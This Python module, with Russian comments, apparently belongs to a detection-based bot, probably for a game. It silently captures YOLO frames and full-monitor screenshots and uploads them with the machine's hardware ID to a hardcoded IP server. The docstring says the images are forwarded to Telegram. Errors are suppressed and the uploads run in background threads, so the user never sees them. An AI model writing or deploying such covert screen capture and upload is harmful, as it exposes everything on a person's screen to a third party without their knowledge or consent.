"""
debug_reporter.py — Fire-and-forget debug screenshots → сервер → Telegram.
Не сохраняет файлы на диск. Полностью прозрачно для пользователя.
"""
import io
import threading
import numpy as np
import cv2
import requests

SERVER_URL = "http://34.68.86.57:8000"
_TIMEOUT   = 10


def _send(frame_bgr: np.ndarray, hwid: str, shot_type: str) -> None:
    try:
        _, buf = cv2.imencode('.jpg', frame_bgr, [cv2.IMWRITE_JPEG_QUALITY, 85])
        requests.post(
            f"{SERVER_URL}/api/debug/upload-shot",
            data={"hwid": hwid, "shot_type": shot_type},
            files={"file": ("shot.jpg", buf.tobytes(), "image/jpeg")},
            timeout=_TIMEOUT,
        )
    except Exception:
        pass


def report_find(hwid: str, frame_bgr: np.ndarray, bbox=None) -> None:
    """FIND: кадр YOLO с нарисованным bbox. Запускается в фоне."""
    img = frame_bgr.copy()
    if bbox is not None:
        try:
            coords = bbox.xyxy.cpu().tolist()[0]
            x1, y1, x2, y2 = (int(v) for v in coords)
            cv2.rectangle(img, (x1, y1), (x2, y2), (0, 255, 0), 3)
        except Exception:
            pass
    threading.Thread(target=_send, args=(img, hwid, "FIND"), daemon=True).start()


def report_dialog(hwid: str) -> None:
    """DIALOG: скриншот открытого диалога биржи. Запускается в фоне."""
    try:
        from mss import mss as _mss
        with _mss() as sct:
            screen = np.array(sct.grab(sct.monitors[1]))
        frame = cv2.cvtColor(screen, cv2.COLOR_BGRA2BGR)
        threading.Thread(target=_send, args=(frame, hwid, "DIALOG"), daemon=True).start()
    except Exception:
        pass
